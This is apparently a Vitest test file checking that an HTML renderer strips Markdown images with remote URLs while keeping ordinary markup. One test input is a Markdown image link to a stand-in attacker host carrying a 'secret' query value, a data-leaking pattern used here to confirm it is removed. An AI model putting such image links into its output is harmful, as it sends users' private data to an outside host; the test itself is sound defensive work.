/**
 * @vitest-environment jsdom
 */
import { describe, expect, it } from "vitest";
import { renderOutputHtml } from "../src/lib/output-format";

describe("renderOutputHtml sanitization", () => {
  it("removes Markdown images with remote URLs", () => {
    const html = renderOutputHtml(
      "Findings\n\n![case note](https://attacker.example/track?case=secret)",
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).not.toContain("case=secret");
  });

  it("keeps ordinary markup and source-range attributes", () => {
    const html = renderOutputHtml("Diagnosis text\n\nMore findings\n");
    expect(html).toContain("<p");
    expect(html).toContain("Diagnosis text");
    expect(html).toContain("data-source-start-line");
  });
});
